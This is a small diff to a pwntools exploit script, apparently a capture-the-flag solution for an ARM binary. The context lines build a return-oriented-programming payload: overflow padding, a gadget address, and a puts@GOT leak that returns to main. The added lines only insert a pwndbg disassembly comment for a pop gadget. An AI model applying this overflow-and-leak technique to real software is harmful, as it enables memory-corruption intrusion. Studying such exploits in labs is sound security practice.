@@ -41,6 +41,10 @@ if __name__ == "__main__":
     '''
     pr0 = 0x00011bbc
     leak  = flat(cyclic(0x54), pr0, elf.got['puts'], elf.plt['puts'])
+    '''
+    pwndbg> x/i $pc
+    => 0xff6a7a48 <puts+400>:	pop	{r4, r5, r6, r7, r8, r9, r10, pc}
+    '''
     leak += flat(elf.sym['main']) * 8
     write_diray(leak)
     logout()
